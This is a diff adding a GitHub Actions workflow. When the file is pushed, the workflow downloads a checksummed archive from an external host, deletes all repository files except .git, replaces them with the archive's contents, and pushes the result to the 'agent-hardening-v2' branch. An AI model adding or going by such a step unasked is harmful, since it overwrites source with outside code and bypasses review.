@@ -1,0 +1,52 @@
+name: Agent hardening v2 source sync
+
+on:
+  push:
+    branches:
+      - agent-hardening-v2
+    paths:
+      - ".github/workflows/agent-hardening-v2-sync.yml"
+
+permissions:
+  contents: write
+
+jobs:
+  sync-source:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Checkout branch
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Download validated VPS snapshot
+        shell: bash
+        run: |
+          curl -fL --retry 3 --retry-delay 2 \
+            https://downloads.hi5central.com/bootstrap-agent-sync/agent-hardening-v2-8a6d9ad.tar.gz \
+            -o /tmp/agent-hardening-v2.tar.gz
+          echo "edcd22668b4db025ec271517d1250d8a0495a92dc09f2d70506c445c66a69141  /tmp/agent-hardening-v2.tar.gz" | sha256sum -c -
+
+      - name: Replace branch with validated snapshot
+        shell: bash
+        run: |
+          rm -rf /tmp/agent-hardening-v2
+          mkdir -p /tmp/agent-hardening-v2
+          tar -xzf /tmp/agent-hardening-v2.tar.gz -C /tmp/agent-hardening-v2
+          find . -mindepth 1 -maxdepth 1 ! -name .git -exec rm -rf {} +
+          cp -a /tmp/agent-hardening-v2/. .
+          git add -A
+          git status --short
+
+      - name: Commit and push snapshot
+        shell: bash
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          if git diff --cached --quiet; then
+            echo "No source changes to sync."
+            exit 0
+          fi
+          git commit -m "Sync agent hardening v2 snapshot"
+          git push origin HEAD:agent-hardening-v2
